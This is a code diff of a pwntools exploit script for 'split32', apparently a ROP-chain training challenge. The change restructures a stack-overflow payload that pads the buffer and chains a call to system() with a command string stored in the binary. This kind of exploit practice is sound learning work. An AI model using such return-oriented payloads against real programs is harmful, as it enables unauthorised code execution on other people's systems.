@@ -1,7 +1,6 @@
 from pwn import *
 
 elf = ELF("split32")
-rop = ROP(elf)
 
 context.binary = elf
 context.terminal = ['konsole', '-e']
@@ -24,13 +23,10 @@ BUFFER_SIZE = 32 + 8
 READ_SIZE = 96
 
 def main():
-    payload = flat \
-    ({
-        BUFFER_SIZE + context.bytes: \
-        [
-            elf.symbols.system, rop.find_gadget(['ret']).address, elf.symbols.usefulString
-        ]
-    })
+    rop = ROP(elf)
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop.raw([elf.symbols.system, 0, elf.symbols.usefulString])
+    payload = rop.chain()
     assert len(payload) <= READ_SIZE
 
     c = connection()
